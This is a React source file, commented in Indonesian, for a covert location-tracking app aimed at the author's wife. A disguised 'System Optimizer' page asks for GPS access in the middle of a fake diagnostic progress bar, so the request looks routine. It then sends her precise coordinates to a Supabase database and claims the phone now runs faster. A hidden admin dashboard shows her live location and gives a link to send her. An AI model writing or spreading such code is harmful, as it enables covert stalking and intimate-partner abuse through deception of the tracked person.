
import React, { useState, useEffect, useCallback } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

// Inisialisasi Supabase
// Pastikan variabel ini diisi di environment hosting Anda
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_KEY || '';
const supabase = (supabaseUrl && supabaseKey) ? createClient(supabaseUrl, supabaseKey) : null;

const App: React.FC = () => {
  const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; // ID unik untuk istri

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagProgress, setDiagProgress] = useState(0);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];

  // Fungsi sinkronisasi ke database
  const syncToDatabase = async (loc: LocationData) => {
    if (!supabase) return;
    const { error } = await supabase
      .from('tracking')
      .upsert({ 
        id: targetId, 
        latitude: loc.latitude, 
        longitude: loc.longitude, 
        accuracy: loc.accuracy, 
        timestamp: loc.timestamp 
      });
    if (error) console.error("Sync Error:", error);
  };

  // Mendengarkan perubahan data (Hanya untuk Admin)
  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      // Fetch data awal
      const fetchData = async () => {
        const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
        if (data) {
          setMembers([{
            ...members[0],
            currentLocation: {
              latitude: data.latitude,
              longitude: data.longitude,
              accuracy: data.accuracy,
              timestamp: data.timestamp
            },
            status: 'online',
            lastSeen: data.timestamp
          }]);
        }
      };
      fetchData();

      // Subscribe ke perubahan realtime
      const channel = supabase
        .channel('schema-db-changes')
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new;
          setMembers([{
            ...members[0],
            currentLocation: {
              latitude: data.latitude,
              longitude: data.longitude,
              accuracy: data.accuracy,
              timestamp: data.timestamp
            },
            status: 'online',
            lastSeen: data.timestamp
          }]);
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode]);

  const updateLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("Hardware Not Supported");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocationError(null);
        const newLocation: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp,
        };

        // Kirim ke database jika di mode stealth (HP Istri)
        if (isStealthMode) {
          await syncToDatabase(newLocation);
        }

        // Update lokal jika admin
        if (isUnlocked && !isStealthMode) {
          setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
          setIsLoadingInsight(true);
          const res = await getLocationInsights(newLocation);
          setInsight(res);
          setIsLoadingInsight(false);
        }
      },
      (err) => {
        setLocationError("Signal Interrupted");
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [isUnlocked, isStealthMode]);

  const startDiagnostic = () => {
    setIsDiagnosing(true);
    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      
      // Minta lokasi di tengah proses agar terlihat seperti bagian dari diagnosa GPS
      if (progress === 40) {
        updateLocation();
      }
      
      if (progress >= 100) {
        clearInterval(interval);
      }
    }, 80);
  };

  const getCleanUrl = () => window.location.origin + window.location.pathname;

  const handleCopyLink = async (key: string) => {
    const url = `${getCleanUrl()}?mode=diagnostic`;
    await navigator.clipboard.writeText(url);
    setCopyStatus(key);
    setTimeout(() => setCopyStatus(null), 2000);
  };

  const openInGoogleMaps = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  // --- RENDER STEALTH MODE (UNTUK ISTRI) ---
  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 overflow-hidden">
        <div className="max-w-md mx-auto w-full space-y-8 animate-in fade-in duration-700">
           <div className="flex items-center gap-3 border-b border-slate-800 pb-6">
              <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg">
                 <i className="fas fa-microchip text-white"></i>
              </div>
              <div>
                 <h1 className="text-sm font-bold uppercase">System Optimizer <span className="text-slate-500 font-normal">v1.4</span></h1>
                 <p className="text-[10px] text-slate-500">Status: {isDiagnosing ? 'Pemeriksaan...' : 'Siaga'}</p>
              </div>
           </div>

           {!isDiagnosing ? (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 text-center space-y-6">
                <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto border border-blue-500/20">
                   <i className="fas fa-shield-virus text-3xl text-blue-500"></i>
                </div>
                <div>
                   <h2 className="text-lg font-bold">Diagnosa Perangkat</h2>
                   <p className="text-slate-400 text-xs mt-2">Pindai integritas sensor, kesehatan baterai, dan optimalkan penggunaan RAM.</p>
                </div>
                <button 
                  onClick={startDiagnostic}
                  className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-sm shadow-xl active:scale-95 transition-all"
                >
                  MULAI OPTIMASI SEKARANG
                </button>
             </div>
           ) : (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 space-y-8">
                <div className="space-y-4">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500">
                      <span>Memproses Core...</span>
                      <span>{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                      <div className="bg-blue-500 h-full transition-all duration-300" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="space-y-3 p-4 bg-slate-950/50 border border-slate-800 rounded-xl">
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPU RENDERER</span>
                      <span className="text-emerald-500 font-bold">OK</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPS ACCURACY</span>
                      <span className="text-emerald-500 font-bold">{diagProgress > 50 ? 'VERIFIED' : 'SCANNING'}</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">NODE_SIGNAL</span>
                      <span className="text-emerald-500 font-bold">{diagProgress > 70 ? 'STABLE' : 'CALIBRATING'}</span>
                   </div>
                </div>

                {diagProgress >= 100 && (
                  <div className="animate-in zoom-in duration-500 space-y-4">
                     <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                        <p className="text-[10px] text-emerald-400 font-bold uppercase">Optimasi Berhasil</p>
                        <p className="text-[9px] text-slate-500 mt-1">Perangkat Anda kini berjalan 20% lebih cepat.</p>
                     </div>
                     <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Tutup</button>
                  </div>
                )}
             </div>
           )}

           <div className="text-center">
              <p className="text-[9px] text-slate-800 uppercase tracking-widest">Diagnostic Session: {Math.random().toString(36).substring(7).toUpperCase()}</p>
           </div>
        </div>
      </div>
    );
  }

  // --- RENDER ADMIN PANEL (UNTUK ANDA) ---
  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar 
        members={members} 
        activeMemberId="1" 
        onSelectMember={() => {}}
        isUnlocked={isUnlocked}
        onUnlock={() => setIsUnlocked(true)}
      />

      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-xs font-bold tracking-widest text-slate-400 uppercase">
              {isUnlocked ? '> ADM_COMMAND_CENTER' : '> SYSTEM_IDLE'}
            </h2>
            {isLoadingInsight && <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>}
          </div>
          {isUnlocked && (
             <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded border border-slate-700 uppercase">Lock_System</button>
          )}
        </header>

        <div className="flex-1 p-8 overflow-y-auto">
          {!isUnlocked ? (
            <div className="max-w-4xl mx-auto space-y-8 text-center py-20 animate-in fade-in">
               <i className="fas fa-shield-halved text-5xl text-slate-800 mb-6"></i>
               <h1 className="text-2xl font-bold">Encrypted Workspace</h1>
               <p className="text-slate-500 text-sm max-w-sm mx-auto">Klik versi build di pojok kiri bawah 5x untuk membuka dashboard pelacakan real-time.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-300">
              <div className="lg:col-span-2 space-y-6">
                
                {/* Telemetry Display */}
                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                   <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
                   <div className="flex justify-between items-center mb-6">
                      <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest flex items-center gap-2">
                        <i className="fas fa-location-dot text-blue-500"></i> Live Target Data
                      </h3>
                      {activeMember.currentLocation && (
                        <button 
                          onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}
                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-[10px] font-bold uppercase transition-all"
                        >
                           Buka Peta Google
                        </button>
                      )}
                   </div>
                   
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-2 gap-4">
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">Target Latitude</p>
                           <p className="text-lg font-bold text-white mono">{activeMember.currentLocation.latitude.toFixed(8)}</p>
                        </div>
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">Target Longitude</p>
                           <p className="text-lg font-bold text-white mono">{activeMember.currentLocation.longitude.toFixed(8)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="p-10 border border-dashed border-slate-800 rounded-2xl text-center">
                        <p className="text-xs text-slate-600 italic">WAITING FOR TARGET SIGNAL...</p>
                     </div>
                   )}
                </div>

                {/* Map Mockup */}
                <div className="bg-slate-900 rounded-3xl aspect-video relative overflow-hidden border border-slate-800 shadow-2xl">
                  <div className="absolute inset-0 bg-[url('https://www.google.com/maps/vt/pb=!1m4!1m3!1i12!2i2605!3i1622!2m3!1e0!2sm!3i420120488!3m8!2sen!3sus!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0')] bg-cover bg-center grayscale opacity-20"></div>
                  
                  {activeMember.currentLocation && (
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
                       <div className="relative">
                          <div className="absolute -inset-10 bg-blue-500/20 rounded-full animate-ping"></div>
                          <div className="w-6 h-6 bg-blue-500 rounded-full border-4 border-slate-900 shadow-lg"></div>
                       </div>
                    </div>
                  )}
                </div>

                {/* Deployment Link */}
                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
                   <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Target Deployment Link</h3>
                   <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-2">
                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-500 outline-none" />
                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'}`}>
                         {copyStatus === 'target' ? 'COPIED' : 'COPY'}
                      </button>
                   </div>
                </div>

              </div>

              <div className="lg:col-span-1">
                <LocationCard 
                  member={activeMember} 
                  insight={insight} 
                  loadingInsight={isLoadingInsight} 
                />
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default App;
